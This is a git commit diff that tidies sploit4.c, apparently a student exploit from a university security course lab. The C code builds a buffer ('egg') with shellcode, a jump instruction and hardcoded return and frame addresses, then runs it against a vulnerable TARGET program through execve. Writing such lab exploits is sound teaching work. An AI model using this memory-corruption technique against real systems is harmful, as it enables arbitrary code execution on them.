3dbca19259eb7ccef59d023a0f6a2a93ecc4ac61
Rafael Moreno Ferrer <rmferrer@gmail.com>
2013-04-22 23:06:55 -0700

    Cleaning up sploit4.c

--- pa/pa1/sploits/sploit4.c
+++ pa/pa1/sploits/sploit4.c
@@ -12,40 +12,36 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-
-  args[0] = TARGET; args[2] = NULL;
-  env[0] = NULL;
-
-  long shellcodeAddr, *addrPtr, fpAddr, f, f2;
-  char exploitStr[EGG_SIZE]; /* string containing exploit code */
+  long shellcodeAddr, *addrPtr, fpAddr, dummyVal, jumpInstr;
+  char egg[EGG_SIZE]; /* string containing exploit code */
   char *ptr;
   int i;
 
   shellcodeAddr = 0x08049C68; // address of buff
-  f = 0xffffffff;
-  f2 = 0xffff06eb; // jump instr
+  dummyVal = 0xffffffff;
+  jumpInstr = 0xffff06eb; // jump instr
   fpAddr = 0xbffffa3c; // addr of eip for foo
 
-  addrPtr = (long *) exploitStr; 
+  addrPtr = (long *) egg; 
   for (i = 0; i < EGG_SIZE; i += 4)
     *(addrPtr++) = 0xffffffff;
 
-  memcpy(&exploitStr[504], &shellcodeAddr, 4);
-  memcpy(&exploitStr[508], &fpAddr, 4);
-  memcpy(&exploitStr[3], &f, 4);
-  memcpy(exploitStr, &f2, 2);
+  memcpy(&egg[504], &shellcodeAddr, 4);
+  memcpy(&egg[508], &fpAddr, 4);
+  memcpy(&egg[3], &dummyVal, 4);
+  memcpy(egg, &jumpInstr, 2);
 
 
   /* Then fill the first bytes of the exploit string with
      Aleph One's shellcode */
-  ptr = &exploitStr[8];
+  ptr = &egg[8];
   for (i = 0; i < strlen(shellcode); i++)
     *(ptr++) = shellcode[i];
 
-
-  exploitStr[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
-  args[1] = exploitStr;
-
+  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
+  
+  args[0] = TARGET; args[1] = egg; args[2] = NULL;
+  env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
